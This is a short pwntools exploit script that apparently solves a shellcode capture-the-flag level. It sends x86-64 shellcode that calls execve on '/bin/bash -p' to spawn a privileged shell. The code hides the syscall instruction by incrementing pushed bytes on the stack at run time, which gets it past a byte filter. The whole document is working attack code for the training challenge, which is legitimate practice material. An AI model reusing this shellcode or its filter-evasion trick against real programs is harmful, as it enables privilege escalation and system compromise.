from pwn import *

context.arch = 'amd64'
context.log_level = "debug"
context.terminal=['tmux','splitw','-h']

p = process('/challenge/babyshell_level6')

shellcode = """
    jmp two
one:
    pop rdi

    push 0x0
    push 0x702d
    push rsp
    pop rdx
    
    push 0x0
    push rdx
    push rdi
    push rsp
    pop rsi
    
    push 0x0
    pop rdx
    push 0x3b
    pop rax
    
    push 0x050e
    inc qword ptr [rsp]
    jmp rsp
    nop
two:
    call one
    .string "/bin/bash"
"""

shellcode = asm(shellcode)

p.send(shellcode)

p.interactive()